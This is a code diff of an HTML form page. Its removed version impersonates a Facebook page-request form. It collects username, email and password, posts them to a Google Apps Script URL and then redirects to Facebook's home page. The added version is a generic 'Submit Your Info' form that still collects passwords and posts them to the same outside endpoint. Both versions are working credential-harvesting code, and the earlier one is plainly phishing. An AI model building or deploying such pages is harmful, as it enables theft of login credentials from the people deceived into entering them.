@@ -2,153 +2,86 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Facebook Request Form</title>
+  <title>Google Sheet Form</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-color: #f0f2f5;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+      background: #f9f9f9;
+      padding: 50px;
     }
-
-    .form-container {
-      background-color: white;
+    .container {
+      max-width: 500px;
+      background: #fff;
       padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-      width: 350px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      margin: auto;
     }
-
-    .form-container h2 {
-      color: #1877f2;
+    h2 {
       text-align: center;
-      margin-bottom: 25px;
+      color: #333;
     }
-
-    .input-group {
-      margin-bottom: 15px;
-    }
-
-    .input-group label {
-      display: block;
-      font-weight: bold;
-      margin-bottom: 5px;
-    }
-
-    .input-group input {
+    input, button {
       width: 100%;
-      padding: 8px;
-      border-radius: 6px;
+      padding: 12px;
+      margin: 10px 0;
       border: 1px solid #ccc;
-    }
-
-    .input-group .error {
-      color: red;
-      font-size: 12px;
-      margin-top: 3px;
-    }
-
-    button {
-      background-color: #1877f2;
-      color: white;
-      padding: 10px;
-      border: none;
-      width: 100%;
-      font-size: 16px;
       border-radius: 6px;
+      font-size: 16px;
+    }
+    button {
+      background-color: #4CAF50;
+      color: white;
+      border: none;
       cursor: pointer;
     }
-
     button:hover {
-      background-color: #165ecc;
+      background-color: #45a049;
     }
+    .success, .error {
+      text-align: center;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+    .success { color: green; }
+    .error { color: red; }
   </style>
 </head>
 <body>
-  <div class="form-container">
-    <h2>Facebook Page Request</h2>
-    <form name="google-sheet" id="requestForm">
-      <div class="input-group">
-        <label for="page-name">Page Name</label>
-        <input type="text" name="page-name" id="page-name">
-        <div class="error" id="error-page-name"></div>
-      </div>
-      <div class="input-group">
-        <label for="username">Username</label>
-        <input type="text" name="username" id="username">
-        <div class="error" id="error-username"></div>
-      </div>
-      <div class="input-group">
-        <label for="email">Email</label>
-        <input type="email" name="email" id="email">
-        <div class="error" id="error-email"></div>
-      </div>
-      <div class="input-group">
-        <label for="password">Password</label>
-        <input type="password" name="password" id="password">
-        <div class="error" id="error-password"></div>
-      </div>
+
+  <div class="container">
+    <h2>Submit Your Info</h2>
+    <form name="google-sheet">
+      <input type="text" name="Page Name" placeholder="Page Name" required>
+      <input type="text" name="Username" placeholder="Username" required>
+      <input type="email" name="Email" placeholder="Email" required>
+      <input type="password" name="Password" placeholder="Password" required>
       <button type="submit">Submit</button>
     </form>
+    <div id="message" class=""></div>
   </div>
 
   <script>
     const scriptURL = 'https://script.google.com/macros/s/AKfycbzPH35e1rwYZpw8oa7iQzbPgM0cbLnu5nZk5TQkU2Kx9cEx39joMjrAuxsnv7r5s2ks/exec';
     const form = document.forms['google-sheet'];
-
-    const validateForm = () => {
-      let valid = true;
-
-      const pageName = document.getElementById('page-name');
-      const username = document.getElementById('username');
-      const email = document.getElementById('email');
-      const password = document.getElementById('password');
-
-      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-
-      // Clear previous errors
-      document.querySelectorAll('.error').forEach(e => e.innerText = '');
-
-      if (!pageName.value.trim()) {
-        document.getElementById('error-page-name').innerText = 'Page Name is required.';
-        valid = false;
-      }
-      if (!username.value.trim()) {
-        document.getElementById('error-username').innerText = 'Username is required.';
-        valid = false;
-      }
-      if (!email.value.trim()) {
-        document.getElementById('error-email').innerText = 'Email is required.';
-        valid = false;
-      } else if (!emailRegex.test(email.value)) {
-        document.getElementById('error-email').innerText = 'Invalid email format.';
-        valid = false;
-      }
-      if (!password.value.trim()) {
-        document.getElementById('error-password').innerText = 'Password is required.';
-        valid = false;
-      }
-
-      return valid;
-    };
+    const messageDiv = document.getElementById('message');
 
     form.addEventListener('submit', e => {
       e.preventDefault();
 
-      if (validateForm()) {
-        fetch(scriptURL, { method: 'POST', body: new FormData(form) })
-          .then(response => {
-            alert("Thanks! Redirecting to Facebook...");
-            window.location.href = "https://www.facebook.com/home";
-          })
-          .catch(error => {
-            alert('Submission failed!');
-            console.error('Error!', error.message);
-          });
-      }
+      fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+        .then(response => {
+          messageDiv.innerHTML = '✅ Submitted successfully!';
+          messageDiv.className = 'success';
+          form.reset();
+        })
+        .catch(error => {
+          console.error('Error!', error.message);
+          messageDiv.innerHTML = '❌ Submission failed!';
+          messageDiv.className = 'error';
+        });
     });
   </script>
+
 </body>
 </html>
